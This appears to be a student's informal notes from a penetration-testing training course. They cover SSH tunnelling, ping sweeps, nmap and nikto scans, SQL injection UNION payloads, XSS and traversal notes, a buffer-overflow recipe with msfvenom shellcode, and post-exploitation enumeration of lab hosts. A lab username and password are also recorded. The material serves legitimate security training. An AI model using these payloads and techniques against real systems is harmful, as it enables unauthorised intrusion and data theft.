Network Recon -
Weaponozaton -
Delivery -
Exploitation -
Installation -XX
Command and Control - 
Actin on Objectives -
- ssh -MS /tmp/jump student@10.50.37.37 # multi plexing
- ssh -S /tmp/jump dummy
- ssh -S /tmp/jump -O forward -D 9050 dummy # sets up forward
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
sudo proxychains nmap -Pn -sT -T4 -p1-10000 ip 2>/dev/null

sudo apt install nikto -y
Network Recon -
Weaponozaton -
Delivery -
Exploitation -
Installation -XX
Command and Control - 
Actin on Objectives -
- ssh -MS /tmp/jump student@10.50.37.30 # multi plexing
- ssh -S /tmp/jump dummy
- ssh -S /tmp/jump -O forward -D 9050 dummy # sets up forward
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
sudo proxychains nmap -Pn -sT -T4 -p1-10000 ip 2>/dev/null

sudo apt install nikto -y
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;# -----GOLDEN Statement for sql injecting


# Notes
ip 10.50.24.239
username YOPA-003-M
password Orionpax and no
stack 9
xfreerdp /v:10.50.23.50 /u:student +clipboard +dynamic-resolution +glyph-cache
ssh student@10.50.33.11 -X
sudo apt install nikto -y # install nitko
ssh -MS /tmp/jump student@10.50.24.239
ssh -S /tmp/jump dummy
---
## Links
- (student guide)[https://sec.cybbh.io/public/security/latest/index.html]
- (cctc)[http://10.50.20.250:8000/resources]
- (vta)[https://vta.cybbh.space/horizon/project/instances/]
- (cve)[https://cve.mitre.org/]
- (exploit db)[https://www.exploit-db.com/]
---
## **Quick Find**
1.
---
## **definitons**
- executive summery - non technical just basic info to officer
- techical summary - indepth for peers
## **notes**
- attack model
  1. Reconnaissances - harvest emails, social engenering, passive , active
    - open source intelligence
    - **DOCUMENT SHIT** what, how, out come if error why, how it was fixed
    - collection - info important to misson
    -
  2. Weaponization -
    - using the creds you got from recon
    - using vunribilitys
    - collection - not attack
    - effect - attack
    - **TEST** - make sure that when you run a exploit it will not brake shit
    - plan - document results and what need to be fixed
    -
  3. Delivery
    -
  4. Explotation
    -
  5. Installation
    -
  6. Command and control
    -
  7. Action on objecyives
    -
- post is sending info
- get is reseving info
- head is geting header info and transfer status
- put is used to create and up date like appending
- http code
  - 10X == Informational
  - 2XX == Success
  - 30X == Redirection
  - 4XX == Client Error
  - 5XX == Server Error
- http is the frame css the design js is the functanaity
- cross site sripting the procces of injecting javacode in to a ligit site that runs js on users browser
- cross site scripting the Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
- two types of XSS
  - refective not perstant
  - stored persistant
- when attacking a file look up or pass though prompt ../../../../../file/name
- SQL is a bitch and pickie with its syntex
- data base and scema are the same
- select and union are most important
- dont look at defult schemas
  - information_schema
  - mysql
  - performance_scemma
  - steps
   1. find what works with options' or 1='1
   2. find colloms with otions that worked; UNION SELECT 1,2,3,4,5;#
   3. ********UNION SELECT table_schema,table_name,column_name FROM information_schema.columns;#  fill in the info fro left to right********
   4. Audi' UNION SELECT id,2,name,pass,5 FROM session.user;# craft new gold statment
## **code**
- multiplexing tunneling
  - M multiplex
  - S where we save
  - O uses forward and cancel
- nitko -h ip or web address
- SQL
  - SHOW DATABASES; # shows database
  - USE session; # like cd
  - SELECT * FROM session; shows all items in the data base
  - select * from session.car # gets info from the item in that database in this case car
  - select * from session.Tire UNION select name,type,cost,color from session.car;
  - ' OR 1='1 select * from users where user = '' OR 1 = '1'
  - # and -- comment
  - @@ version # give verson
  - UNION SELECT 1,2,3,4,5;#
  - UNION select <column>,<column>,<column> from <database>.<table>
## **how to use**
- ssh -MS /file/location creds@ip
- ssh -S same/file something
- ssh -S /same/file -O forward -D 9050 || -L port:ip:port dummy
- for i in {1...254}; do (ping -c 1 ip.$i | grep "bytes from" &); done
- proxychains sudo nmap -Pn -T4 -sT -p1-10000 ip 2>/dev/null
- proxychains sudo nmap -Pn -T4 -sT -p 80,8080 ip --script http-enum.nse|smb-os-discovery.nse  2>/dev/null
## **examples**
- ssh -MS /tmp/jump student@10.50.24.239 # multi plexing
- ssh -S /tmp/jump dummy
- ssh -S /tmp/jump -O forward -D 9050 dummy # sets up forward
- ssh -S /tmp/jump -O cancel -D 9050 dummy # ends forward
- ssh -S /tmp/jump -O forward -L 3333:192.168.28.111:2222 dummy
- ssh -S /tmp/jump -O cancel -L 3333:192.168.28.111:2222 dummy
## scan script
- for i in {96..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
## scans that are useful
- proxychains sudo nmap -Pn -T4 -sT -p1-10000 192.168.28.111 2>/dev/null
- proxychains sudo nmap -Pn -T4 -sT -p 80,8080 192.168.28.111 --script http-enum.nse|smb-os-discovery.nse  2>/dev/null
https://webbreacher.files.wordpress.com/2018/07/data-collection3.png?w=1136
cve.mitre.orgcve.mitre.org
CVE -  CVE
The mission of the CVE® Program is to identify, define, and catalog publicly disclosed cybersecurity vulnerabilities.
  
  
  
  buff
  find overflow valye
  find eip offset 
  env - gdb func (low quality gdb)
  remove env vars
  (show env ---- unset "var")
  run func
  overflow manually
  info proc map
  find /b 0xf7de1000,0xf7ffe000,0xff,0xe4
        (^is line after heap)(^ is line before stack)
  
 msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
copy shell code 
  sudo ./func <<< $(python buff.py)
      if root 
      change the whoami to command you want to run
               
get flag
                         10.50 == NO IP A
                         
     ENUMERATION
                         
                         cat /etc/passwd --user group shell home
                         ps -elfi &&
                         chkconfig (sysv)
                         systemctl --type=service (systemd)
                         ifconfig -a 
                         ip a
                         net user -- local users windows
                         tasklist /v
                         tasklist /svc
                         ipconfig /all
                         
                         comrade@lin:~$ cat /etc/cron.hourly/startscript 

                         
                         tcpdump: listening on ens3, link-type EN10MB (Ethernet), capture size 262144 bytes
16:58:15.787073 IP (tos 0x0, ttl 64, id 48908, offset 0, flags [DF], proto TCP (6), length 60)
    192.168.150.253.43462 > 192.168.56.1.514: Flags [S], cksum 0x507e (incorrect -> 0xa93e), seq 635468960, win 64860, options [mss 1410,sackOK,TS val 3400677451 ecr 0,nop,wscale 7], length 0
	0x0000:  4500 003c bf0c 4000 4006 2b60 c0a8 96fd
	0x0010:  c0a8 3801 a9c6 0202 25e0 7ca0 0000 0000
	0x0020:  a002 fd5c 507e 0000 0204 0582 0402 080a
	0x0030:  cab2 384b 0000 0000 0103 0307
16:58:49.067085 IP (t
  
  
  
  os 0x0, ttl 64, id 48909, offset 0, flags [DF], proto TCP (6), length 60)
    192.168.150.253.43462 > 192.168.56.1.514: Flags [S], cksum 0x507e (incorrect -> 0x273f), seq 635468960, win 64860, options [mss 1410,sackOK,TS val 3400710730 ecr 0,nop,wscale 7], length 0
	0x0000:  4500 003c bf0d 4000 4006 2b5f c0a8 96fd
	0x0010:  c0a8 3801 a9c6 0202 25e0 7ca0 0000 0000
	0x0020:  a002 fd5c 507e 0000 0204 0582 0402 080a
	0x0030:  cab2 ba4a 0000 0000 0103 0307

2 packets captured
2 packets received by filter
0 packets dropped by kernel

                         
                         1.) whoami && hostname
                         2.) ip a
                         3.) cat /etc/hosts
                         4.) for i in {1..254}; do (ping -c 1 x.x.x.$i | grep "bytes from" &); done
                         5.) LOOK AT CTF FOR NEXT COMMANDS
                         5.) ps -elf look for rsyslog--(as an attacker) also look for script look for rkhunter
                         6.) hail mary ls -latr /etc
                         7.) ls -latr /var/log
                         8.)systemctl --type=servoce --no-pager
                         9.) ls -latr /etc/cron*     ls -latr /var/spool/crontab ls -latr /var/spool/at crontab -l
                         10.) ls -latr tmp ls -latr ~ 
                         11.) sudo -l 
                         12.) cat /etc/groupwho 
                         13.) less /etc/rsyslog.conf 
                         14 ) less /etc/rsyslog.d/(each log)
                         scp -o "ControlPath=/tmp/young" dummy:/home/student/not_real.txt .
                         scp -o "ControlPath=/tmp/young" .no_the_codes.txt anything:/home/student/my_upload
